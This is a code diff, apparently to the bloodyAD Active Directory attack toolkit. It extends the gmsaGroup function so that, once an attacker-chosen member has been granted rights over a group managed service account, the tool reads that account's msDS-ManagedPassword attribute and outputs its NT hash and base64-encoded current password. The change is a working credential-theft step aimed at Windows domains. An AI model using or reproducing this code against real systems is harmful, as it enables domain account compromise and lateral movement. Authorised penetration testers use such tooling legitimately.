@@ -9,6 +9,7 @@ from bloodyAD.exceptions import BloodyError
 from bloodyAD.cli_modules import set as bloodySet
 import badldap
 from badldap.commons.keycredential import KeyCredential
+from badldap.wintypes.managedpassword import MSDS_MANAGEDPASSWORD_BLOB
 from kerbad.common import factory
 from kerbad.common.spn import KerberosSPN
 from kerbad.common.kirbi import Kirbi
@@ -490,6 +491,17 @@ async def gmsaGroup(conn: ConnectionHandler, gmsa_account: str, new_member: str)
     )
 
     LOG.info(f"{new_member} can now retrieve the password of {gmsa_account}")
+    async for entry in ldap.bloodysearch(
+        gmsa_account, attr=["msDS-ManagedPassword"], raw=True
+    ):
+        gmsa_blob = MSDS_MANAGEDPASSWORD_BLOB.from_bytes(entry["msDS-ManagedPassword"][0])
+        yield {
+            "distinguishedName": entry["distinguishedName"],
+            "msDS-ManagedPassword": {
+                "NT": gmsa_blob.nt_hash,
+                "B64ENCODED": base64.b64encode(gmsa_blob.CurrentPassword).decode(),
+            },
+        }
 
 
 async def rbcd(conn: ConnectionHandler, target: str, service: str):
